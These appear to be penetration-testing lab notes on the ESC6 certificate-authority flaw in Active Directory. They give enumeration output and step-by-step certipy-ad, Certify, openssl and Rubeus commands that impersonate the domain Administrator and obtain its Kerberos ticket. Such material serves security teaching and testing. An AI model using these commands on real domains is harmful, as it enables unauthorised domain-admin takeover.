This attack vector leverages over a CA configuration in order to PE via impersonation.
This bug has been patched by Microsoft on the `CVE-2022-26923 - Active Directory Domain Services Elevation of Privilege Vulnerability` but it is still worth checking.

The core concern lies in the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. As [Microsoft describes](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786426(v=ws.11)), "If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name." The `EDITF_ATTRIBUTESUBJECTALTNAME2` flag impacts the entire Certificate Authority, meaning that every certificate template enabling non or less-privileged users to request a certificate with Client Authentication (1.3.6.1.5.5.7.3.2) EKU can be exploited, (e.g., the default User template). This means we can request a certificate with any user designated as an additional `User Principal Name (UPN)`.


## Requisites
As described in the introduction the flag `EDITF_ATTRIBUTESUBJECTALTNAME2` must be enabled on the CA, plus the patch released by Microsoft in 2022n should not be installed.


## Enumeration
**Linux:**
```
certipy-ad find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

<SNIP>
[*] Enumeration output:
Certificate Authorities                                                                                                                           
  0                                                                                                                                               
    CA Name                             : lab-LAB-DC-CA                                                                                           
    DNS Name                            : LAB-DC.lab.local                                                                                        
    Certificate Subject                 : CN=lab-LAB-DC-CA, DC=lab, DC=local                                                                      
    Certificate Serial Number           : 16BD1CE8853DB8B5488A16757CA7C101                                                                        
    Certificate Validity Start          : 2022-03-26 00:07:46+00:00                                                                               
    Certificate Validity End            : 2027-03-26 00:17:46+00:00      
    Web Enrollment                      : Enabled                                                                                                 
    User Specified SAN                  : Enabled                                                                                                 
    Request Disposition                 : Issue                          
    Enforce Encryption for Requests     : Disabled                   
    Permissions                                                          
      Owner                             : LAB.LOCAL\Administrators                                                                                
      Access Rights                                                      
        Enroll                          : LAB.LOCAL\Authenticated Users  
                                          LAB.LOCAL\Black Wasp
                                          LAB.LOCAL\user_manageCA
        ManageCa                        : LAB.LOCAL\Black Wasp      
                                          LAB.LOCAL\user_manageCA    
                                          LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
        ManageCertificates              : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
                                          LAB.LOCAL\Administrators
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
      ESC7                              : 'LAB.LOCAL\\Black Wasp' has dangerous permissions
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
      ESC11                             : Encryption is not enforced for ICPR requests
```
The option that makes it vulnerable is `User Specified SAN: Enabled`.

**Windows:**
```
.\Certify.exe cas

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=lab,DC=local'
<SNIP>
[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : lab-LAB-DC-CA
    DNS Hostname                  : LAB-DC.lab.local
    FullName                      : LAB-DC.lab.local\lab-LAB-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lab-LAB-DC-CA, DC=lab, DC=local
    Cert Thumbprint               : CF54249CAEFB0E092265BFD306940DCBABA4C9A6
    Cert Serial                   : 16BD1CE8853DB8B5488A16757CA7C101
    Cert Start Date               : 26/03/2022 01:07:46
    Cert End Date                 : 26/03/2027 01:17:46
    Cert Chain                    : CN=lab-LAB-DC-CA,DC=lab,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544
```
The option that make it vulnerable is `UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!`.

# Attack Time
The attack vector can be performed on same ways both from a Window or Linux based OS.
## Linux way
- To abuse on Linux we can start by enrolling a certificate with an alternative SAN name to impersonate Administrator account.
```
certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template User -upn Administrator@lab.local
```
OBS: by default it shouldn't be possible, but since the *FLAG* is set and the *patch* not installed a full **ESC1 attack** is possible in one go!
- Next, you can use the *Administrator.pfx* certificate to request a TGT and perform further attacks as seen on the ESC1 attack.

## Windows way
To carry out this attack, we need a template that allows `client authentication`, as is the case with the default `User template`, and include an alternative SAN, in this case, the administrator.
- We request the certificate
```
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /altname:Administrator
```
- Convert it from PEM to PFX
```
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- Request and inject into session a TGT for the Administrator account
```
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx
```
- Enjoy the TGT ticket to execute your attacks!